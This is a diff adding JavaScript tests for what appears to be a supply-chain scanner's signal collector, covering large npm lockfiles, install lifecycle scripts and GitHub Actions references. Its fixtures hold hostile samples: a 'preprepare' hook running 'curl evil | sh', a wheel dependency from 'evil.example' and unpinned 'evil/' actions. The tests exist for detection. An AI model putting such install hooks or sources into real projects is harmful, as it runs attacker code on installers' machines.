@@ -105,3 +105,37 @@ test('supply-chain CLI reads only explicit in-root non-symlink files', () => {
     rmSync(directory, { recursive: true, force: true });
   }
 });
+
+test('supply-chain collector reads a lockfile larger than 512 KiB within the total budget', () => {
+  const packages = { '': {} };
+  for (let index = 0; index < 4000; index += 1) {
+    packages[`node_modules/p${index}`] = { version: '1.0.0', resolved: `https://registry.npmjs.org/p${index}/-/p-1.0.0.tgz`, integrity: `sha512-${'x'.repeat(100)}` };
+  }
+  const content = JSON.stringify({ lockfileVersion: 3, packages }, null, 2);
+  assert.ok(Buffer.byteLength(content) > 512 * 1024);
+  const [file] = collectSupplyChainSignals([{ path: 'package-lock.json', content }]).files;
+  assert.equal(file.type, 'npm-lockfile');
+  assert.equal(file.analyzed, true);
+});
+
+test('supply-chain collector reports every script npm install runs and marks unanalyzed files', () => {
+  const scripts = { preprepare: 'curl evil | sh', postprepare: 'x', prepublish: 'y', test: 'z' };
+  const { files } = collectSupplyChainSignals([
+    { path: 'package.json', content: JSON.stringify({ scripts }) },
+    { path: 'pyproject.toml', content: '[project]\ndependencies = ["x @ https://evil.example/x.whl"]\n' }
+  ]);
+  const manifest = files.find((file) => file.path === 'package.json');
+  assert.deepEqual(manifest.signals.filter((s) => s.ruleId === 'SC_INSTALL_LIFECYCLE_SCRIPT').map((s) => s.name), ['prepublish', 'preprepare', 'postprepare']);
+  assert.equal(files.find((file) => file.path === 'pyproject.toml').analyzed, false);
+});
+
+test('supply-chain collector reads flow-mapping and folded workflow action references', () => {
+  const { files } = collectSupplyChainSignals([{
+    path: '.github/workflows/ci.yml',
+    content: 'jobs:\n  a:\n    steps:\n      - { uses: evil/action@main }\n      - uses: >-\n          evil/other@main\n'
+  }]);
+  assert.deepEqual(files[0].signals.map(({ line, reference, referenceType }) => `${line}:${reference}:${referenceType}`), [
+    '4:evil/action@main:named-ref',
+    '6:evil/other@main:named-ref'
+  ]);
+});
